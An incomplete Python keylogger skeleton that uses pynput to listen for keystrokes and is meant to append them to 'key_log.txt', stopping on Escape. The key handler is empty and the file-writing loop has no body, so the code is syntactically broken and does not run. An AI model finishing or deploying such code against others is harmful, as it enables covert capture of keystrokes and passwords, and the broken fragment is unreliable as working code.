import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    pass

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            # Loop

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()